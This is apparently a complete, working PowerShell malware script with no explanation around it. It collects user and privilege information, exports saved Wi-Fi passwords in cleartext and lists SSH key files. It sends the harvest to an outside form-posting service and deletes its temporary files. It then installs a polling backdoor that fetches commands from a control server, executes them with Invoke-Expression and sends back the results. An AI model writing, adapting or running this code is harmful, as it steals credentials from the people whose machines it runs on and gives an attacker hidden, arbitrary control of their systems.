$ErrorActionPreference = "SilentlyContinue"

$harvest = "[SYSTEM RECON]`n"
$harvest += "User: $(whoami /all)`n"
$harvest += "Privs: $([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)`n"

netsh wlan export profile key=clear folder="$env:TEMP" | Out-Null
Get-ChildItem "$env:TEMP\Wi-Fi-*.xml" | ForEach-Object {
    $harvest += "`nSSID: $($_.Name)`n"
    $harvest += $(Select-String "keyMaterial" $_ | Out-String)
}

$sshPath = "$env:USERPROFILE\.ssh"
if (Test-Path $sshPath) {
    $harvest += "`n[SSH KEYS FOUND]`n"
    $harvest += Get-ChildItem $sshPath -File | ForEach-Object { "$($_.Name)`n" }
}

$body = @{ name = "Win11_Recon"; message = $harvest }
Invoke-WebRequest -Uri "https://formspree.io/f/mkogqrrz" -Method POST -Body $body -UseBasicParsing | Out-Null

Remove-Item "$env:TEMP\Wi-Fi-*.xml" -Force

$C2_URL = "http://192.168.1.15:80"

while($true) {
    try {
        $command = (Invoke-WebRequest -Uri $C2_URL -Method Get -UseBasicParsing).Content
        
        if ($command -and $command -ne "sleep") {
            $output = (Invoke-Expression $command 2>&1 | Out-String)
            
            Invoke-WebRequest -Uri "$C2_URL/results" -Method POST -Body $output -UseBasicParsing | Out-Null
        }
    } catch {
    }
    Start-Sleep -Seconds 5
}
